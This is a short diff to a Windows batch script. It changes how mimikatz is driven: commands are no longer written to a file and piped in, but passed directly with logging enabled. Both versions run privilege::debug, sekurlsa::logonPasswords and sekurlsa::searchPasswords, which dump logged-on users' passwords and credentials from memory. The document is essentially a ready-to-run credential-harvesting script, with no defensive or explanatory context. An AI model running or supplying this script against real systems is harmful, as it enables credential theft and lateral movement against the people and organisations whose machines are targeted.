@@ -1,8 +1,5 @@
 @echo off
-echo privilege::debug > actions
-echo sekurlsa::logonPasswords >> actions
-echo sekurlsa::searchPasswords >> actions
-echo exit >> actions
 
-type actions | .\mimikatz.exe
+.\mimikatz.exe log privilege::debug sekurlsa::logonPasswords sekurlsa::searchPasswords exit
+
 
